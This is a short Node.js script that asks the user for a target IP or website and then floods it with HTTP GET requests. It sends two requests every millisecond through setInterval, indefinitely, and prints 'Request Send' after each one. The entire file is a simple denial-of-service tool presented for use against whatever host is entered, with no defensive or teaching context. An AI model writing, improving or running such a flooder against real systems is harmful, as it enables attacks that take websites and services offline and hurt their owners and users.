var request = require("request")
var rl = require("readline").createInterface({
    input: process.stdin,
    output: process.stdout
})

rl.question("Ip/Website Target : ", ip => {
    setInterval(loop, 1)
    function loop() {
        request.get("http://"+ip, function(err, res, body) {
            if (err) {
                console.log("Ip/Website Not Found, Or Your Interner Is Down")
            }
            else {
                console.log("Request Send")
            }
        })
        request.get("http://"+ip, function(err, res, body) {
            if (err) {
                console.log("Ip/Website Not Found, Or Your Interner Is Down")
            }
            else {
                console.log("Request Send")
            }
        })
    }
})